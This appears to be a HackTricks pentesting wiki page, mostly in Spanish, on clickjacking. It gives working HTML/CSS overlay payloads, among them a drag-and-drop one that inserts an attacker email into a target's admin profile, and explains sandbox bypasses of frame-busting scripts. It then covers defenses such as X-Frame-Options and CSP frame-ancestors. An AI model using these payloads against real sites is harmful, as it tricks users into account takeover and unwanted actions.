# Clickjacking

{{#include ../banners/hacktricks-training.md}}

## ¿Qué es Clickjacking

En un ataque de clickjacking, un **usuario** es **engañado** para **hacer clic** en un **elemento** de una página web que es **invisible** o está disfrazado como otro elemento. Esta manipulación puede provocar consecuencias no deseadas para el usuario, como la descarga de malware, el redireccionamiento a páginas web maliciosas, el suministro de credenciales o información sensible, transferencias de dinero o la compra en línea de productos.

### Truco para prellenar formularios

A veces es posible **llenar el valor de los campos de un formulario usando parámetros GET al cargar una página**. Un atacante puede abusar de este comportamiento para rellenar un formulario con datos arbitrarios y enviar la carga útil de clickjacking para que el usuario pulse el botón Submit.

### Rellenar formulario con Drag\&Drop

Si necesitas que el usuario **rellene un formulario** pero no quieres pedirle directamente que escriba información específica (como el email y/o una contraseña concreta que conoces), puedes simplemente pedirle que **Drag\&Drop** algo que escribirá tus datos controlados, como en [**this example**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag_drop/).

### Basic Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Payload multietapa
```css
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Drag\&Drop + Click payload
```css
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Si has identificado un **XSS attack that requires a user to click** en algún elemento para **trigger** el XSS y la página es **vulnerable to clickjacking**, podrías abusar de ello para engañar al usuario y hacerle clicar el botón/enlace.\
Example:\
Has encontrado un **self XSS** en algunos detalles privados de la cuenta (detalles que **only you can set and read**). La página con el **form** para establecer estos detalles es **vulnerable** a **Clickjacking** y puedes **prepopulate** el **form** con los GET parameters.\
Un atacante podría preparar un ataque de **Clickjacking** contra esa página **prepopulating** el **form** con el **XSS payload** y **tricking** al **user** para que **Submit** el formulario. Entonces, **when the form is submitted** y los valores se modifican, el **user will execute the XSS**.


### DoubleClickjacking

Firstly [explained in this post](https://securityaffairs.com/172572/hacking/doubleclickjacking-clickjacking-on-major-websites.html), esta técnica pediría a la víctima que haga doble clic en un botón de una página personalizada situada en una ubicación específica, y usaría las diferencias de tiempo entre los eventos mousedown y onclick para cargar la página de la víctima durante el doble clic de modo que la **victim actually clicks a legit button in the victim page**.

An example could be seen in this video: [https://www.youtube.com/watch?v=4rGvRRMrD18](https://www.youtube.com/watch?v=4rGvRRMrD18)

A code example can be found in [this page](https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html).

> [!WARNING]
> This technique allows to trick the user to click on 1 place in the victim page bypassing every protection against clickjacking. So the attacker needs to find **sensitive actions that can be done with just 1 click, like OAuth prompts accepting permissions**.

### Browser extensions: DOM-based autofill clickjacking

Además de iframizar páginas de la víctima, los atacantes pueden apuntar a elementos de la UI de extensiones del navegador que se inyectan en la página. Los gestores de contraseñas renderizan dropdowns de autofill cerca de los inputs enfocados; al enfocar un campo controlado por el atacante y ocultar/ocluir el dropdown de la extensión (trucos de opacity/overlay/top-layer), un clic coaccionado del usuario puede seleccionar un elemento guardado y rellenar datos sensibles en inputs controlados por el atacante. Esta variante no requiere exposición por iframe y funciona totalmente mediante manipulación del DOM/CSS.

- For concrete techniques and PoCs see:
-
{{#ref}}
browser-extension-pentesting-methodology/browext-clickjacking.md
{{#endref}}

## Strategies to Mitigate Clickjacking

### Client-Side Defenses

Los scripts ejecutados en el lado del cliente pueden realizar acciones para prevenir Clickjacking:

- Asegurarse de que la ventana de la aplicación sea la ventana principal o superior.
- Hacer visibles todos los frames.
- Evitar clics en frames invisibles.
- Detectar y alertar a los usuarios sobre intentos potenciales de Clickjacking.

Sin embargo, estos frame-busting scripts pueden ser eludidos:

- **Configuraciones de seguridad del navegador:** Algunos navegadores podrían bloquear estos scripts según sus configuraciones de seguridad o la falta de soporte de JavaScript.
- **Atributo sandbox de iframe HTML5:** Un atacante puede neutralizar los frame buster scripts configurando el atributo sandbox con los valores allow-forms o allow-scripts sin allow-top-navigation. Esto impide que el iframe verifique si es la ventana superior, e.g.,
```html
<iframe
id="victim_website"
src="https://victim-website.com"
sandbox="allow-forms allow-scripts"></iframe>
```
Los valores allow-forms y allow-scripts permiten acciones dentro del iframe mientras deshabilitan la navegación a nivel superior. Para asegurar la funcionalidad prevista del sitio objetivo, podrían ser necesarios permisos adicionales como allow-same-origin y allow-modals, dependiendo del tipo de ataque. Los mensajes de la consola del navegador pueden indicar qué permisos permitir.

### Server-Side Defenses

#### X-Frame-Options

The **X-Frame-Options HTTP response header** informa a los navegadores sobre la legitimidad de renderizar una página en un <frame> o <iframe>, ayudando a prevenir Clickjacking:

- X-Frame-Options: deny - Ningún dominio puede incluir el contenido en un frame.
- X-Frame-Options: sameorigin - Solo el mismo sitio puede incluir el contenido en un frame.
- X-Frame-Options: allow-from https://trusted.com - Solo el 'uri' especificado puede incluir la página en un frame.
- Note the limitations: if the browser doesn't support this directive, it might not work. Some browsers prefer the CSP frame-ancestors directive.

#### Content Security Policy (CSP) frame-ancestors directive

**frame-ancestors directive in CSP** es el método recomendado para la protección contra Clickjacking:

- frame-ancestors 'none' - Similar a X-Frame-Options: deny.
- frame-ancestors 'self' - Similar a X-Frame-Options: sameorigin.
- frame-ancestors trusted.com - Similar a X-Frame-Options: allow-from.

For instance, the following CSP only allows framing from the same domain:

Content-Security-Policy: frame-ancestors 'self';

Further details and complex examples can be found in the [frame-ancestors CSP documentation](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) and [Mozilla's CSP frame-ancestors documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Content Security Policy (CSP) with child-src and frame-src

**Content Security Policy (CSP)** es una medida de seguridad que ayuda a prevenir Clickjacking y otros ataques de inyección de código al especificar qué fuentes debe permitir el navegador para cargar contenido.

#### frame-src Directive

- Defines valid sources for frames.
- More specific than the default-src directive.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Esta política permite frames desde el mismo origen (self) y https://trusted-website.com.

#### child-src Directiva

- Introducida en CSP nivel 2 para establecer fuentes válidas para web workers y frames.
- Actúa como respaldo para frame-src y worker-src.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Esta política permite frames y workers desde el mismo origen (self) y https://trusted-website.com.

**Notas de uso:**

- Deprecación: child-src está siendo eliminado en favor de frame-src y worker-src.
- Comportamiento de fallback: Si frame-src está ausente, child-src se usa como fallback para frames. Si ambos están ausentes, se usa default-src.
- Definición estricta de fuentes: Incluye solo fuentes de confianza en las directivas para prevenir la explotación.

#### JavaScript: scripts para impedir el enmarcado

Aunque no son completamente infalibles, los scripts de frame-busting basados en JavaScript pueden usarse para evitar que una página web sea enmarcada. Ejemplo:
```javascript
if (top !== self) {
top.location = self.location
}
```
#### Empleando Anti-CSRF Tokens

- **Validación de tokens:** Utilice anti-CSRF tokens en aplicaciones web para garantizar que las solicitudes que modifican el estado se realicen intencionalmente por el usuario y no a través de una página Clickjacked.

## Referencias

- [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
- [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)

{{#include ../banners/hacktricks-training.md}}
